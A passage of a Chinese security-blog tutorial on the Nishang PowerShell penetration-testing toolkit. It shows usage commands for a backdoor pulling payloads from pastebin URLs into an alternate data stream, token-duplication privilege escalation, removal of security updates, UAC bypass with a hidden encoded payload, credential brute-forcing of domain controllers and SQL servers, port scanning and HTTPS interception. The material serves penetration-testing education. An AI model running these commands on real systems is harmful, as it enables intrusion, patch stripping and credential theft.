com/raw.php?i=jqP2vJ3x&nbsp;http://pastebin.com/raw.php?i=Zhyf8rwh&nbsp;start123&nbsp;stopthis</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这个脚本主要有两个参数，在上面介绍其他后门当中已经说明了，这里是类似的&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">需要说明的是，执行后它会在AppData的目录下建立一个ads并把我们的Payload注入进去，如果我们希望在cmd下看到我们这里建立的ads，需要使用：dir /a /r</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.客户端</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">对于这一部分的脚本，我就不再赘述了，因为网上早已经有了对于这一部分脚本的介绍说明：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用Powershell Client进行有效钓鱼</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5.权限提升</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Enable-DuplicateToken</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个脚本可以帮助我们在已经获得了一定权限的情况下，使我们提升到System权限。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Enable-DuplicateToken</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">具体的相关介绍可以查阅：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/05/use-powershell-to-duplicate-process-tokens-via-pinvoke/" _src="https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/05/use-powershell-to-duplicate-process-tokens-via-pinvoke/">https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/05/use-powershell-to-duplicate-process-tokens-via-pinvoke/</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Remove-Update</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个脚本可以帮助我们移除系统所有的更新，或所有安全更新，以及指定编号的更新。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Remove-Update&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//移除目标机器上的所有更新
PS&nbsp;&gt;&nbsp;Remove-Update&nbsp;Security&nbsp;&nbsp;//移除目标机器上所有安全相关更新
PS&nbsp;&gt;&nbsp;Remove-Update&nbsp;KB2761226&nbsp;//移除指定编号的更新</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">Invoke-PsUACme</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Invoke-PsUACme使用了来自于UACME项目的DLL来Bypass UAC。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t011c577722427825d3.jpg" title="t01c9d46ef0d4616a20.jpg" alt="http://p9.qhimg.com/t01c9d46ef0d4616a20.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">上表给出了各种UAC绕过的方法，我们可以在Invoke-PsUACme中指定相应方法执行。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Invoke-PsUACme&nbsp;-Verbose&nbsp;//使用Sysprep方法和默认的Payload执行
PS&nbsp;&gt;&nbsp;Invoke-PsUACme&nbsp;-method&nbsp;oobe&nbsp;-Verbose&nbsp;//使用oobe方法和默认的Payload执行
PS&nbsp;&gt;&nbsp;Invoke-PsUACme&nbsp;-method&nbsp;oobe&nbsp;-Payload&nbsp;&quot;powershell&nbsp;-windowstyle&nbsp;hidden&nbsp;-e&nbsp;YourEncodedPayload&quot;&nbsp;//使用-Payload参数可以自行指定要执行的Payload</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">除开以上而外，我们还可以使用-PayloadPath参数来指定Payload的路径，默认情况下Payload会在C:\Windows\Temp\cmd.bat结束。还可以使用-CustomDLL64（64位）或-CustomDLL32（32位）参数来自定义一个DLL文件。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">6.扫描</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Invoke-BruteForce</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个脚本可以对SQL Server、域控制器、Web以及FTP进行口令的爆破&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Invoke-BruteForce&nbsp;-ComputerName&nbsp;targetdomain.com&nbsp;-UserList&nbsp;C:\test\users.txt&nbsp;-PasswordList&nbsp;C:\test\wordlist.txt&nbsp;-Service&nbsp;ActiveDirectory&nbsp;-StopOnSuccess&nbsp;-Verbose&nbsp;//爆破域控制器
PS&nbsp;&gt;&nbsp;Invoke-BruteForce&nbsp;-ComputerName&nbsp;SQLServ01&nbsp;-UserList&nbsp;C:\test\users.txt&nbsp;-PasswordList&nbsp;C:\test\wordlist.txt&nbsp;-Service&nbsp;SQL&nbsp;-Verbose&nbsp;&nbsp;//爆破SQL&nbsp;Server
PS&nbsp;&gt;&nbsp;cat&nbsp;C:\test\servers.txt&nbsp;|&nbsp;Invoke-BruteForce&nbsp;-UserList&nbsp;C:\test\users.txt&nbsp;-PasswordList&nbsp;C:\test\wordlist.txt&nbsp;-Service&nbsp;SQL&nbsp;-Verbose&nbsp;&nbsp;//爆破server.txt中所有servers的SQL&nbsp;Server</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">主要的参数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">ComputerName&nbsp;用于指定对应服务的计算机名
UserList&nbsp;用户名字典
PasswordList&nbsp;密码字典
Service&nbsp;服务类型（注意默认为：SQL）
StopOnSuccess&nbsp;成功找到一个后就停止执行</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">Invoke-PortScan</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">利用这个脚本我们可以在目标机器上对内网进行端口扫描&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;Invoke-PortScan&nbsp;-StartAddress&nbsp;192.168.0.1&nbsp;-EndAddress&nbsp;192.168.10.254&nbsp;-ResolveHost&nbsp;-ScanPort&nbsp;-Port&nbsp;80</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">主要的参数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">StartAddress&nbsp;扫描范围开始的地址
EndAddress&nbsp;扫描范围结束的地址
ScanPort&nbsp;进行端口扫描
Port&nbsp;指定扫描端口（默认扫描端口：21,22,23,53,69,71,80,98,110,139,111,&nbsp;
389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901）
TimeOut&nbsp;设置超时时间</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">7.中间人</span></strong></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Invoke-Interceptor</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个脚本可以通过建立一个代理服务器的方式来拦截HTTPS的请求，并将这些请求记录下来&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;Invoke-Interceptor&nbsp;-ProxyServer&nbsp;192.168.230.21&nbsp;-ProxyPort&nbsp;3128&nbsp;//这条命令将默认在8081端口监听并把请求发送给上游代理的3128端口</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">可以通过ListenPort来修改我们目标机器上的监听端口（默认8081端口）&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">例如&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们在目标机器上执行：</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t0170d54794b04910ae.jpg" title="t01108504b824418a77.jpg" alt="http://p2.qhimg.com/t01108504b824418a77.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后这里本机我用NC来监听对应端口：</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t016f90a81040f75025.jpg" title="t015396b289b83165bf.jpg" alt="http://p2.qhimg.com/t015396b289b83165bf.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接收到了来自目标机的请求数据&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">并且这个脚本会在目标机的TEMP目录下生成interceptor.log的文件来记录请求数据</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t0104c6f27a941f1c30.jpg" title="t0108af44f2c3f7f555.jpg" alt="http://p2.qhimg.com/t0108af44f2c3f7f555.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x03 结语</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Nishang这款基于PowerShell的渗透测试专用工具集成了非常多实用的脚本与框架，方便我们在渗透测试过程之中使用。尽管，在一些环境下我们可能没有办法去执行Powershell，但是通过查看这些脚本的具体代码，我们也可以自己去完成实现脚本提供的一些功能。限于篇幅，本文只能抛砖引玉地介绍Nishang的部分功能，希望大家能够在实际的应用之中去体验。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">参考</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">1. <a href="http://www.labofapenetrationtester.com/" _src="http://www.labofapenetrationtester.com/">http://www.labofapenetrationtester.com/</a></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2. <a href="https://github.com/samratashok/nishang/" _src="https://github.com/samratashok/nishang/">https://github.com/samratashok/nishang/</a></span></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">传送门</span></strong></span></p><hr style="white-space: normal;"/><p style="white-space: normal; text-indent: 2em;"><a href="http://bobao.360.cn/learning/detail/3182.html" target="_blank" style="text-indent: 2em; text-decoration: none;"><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">【技术分享】Powershell 渗透测试工具-Nishang（一）</span></strong></span></a></p><p style="text-align: center;"><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3200.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】Powershell 渗透测试工具-Nishang（二） - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3200" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
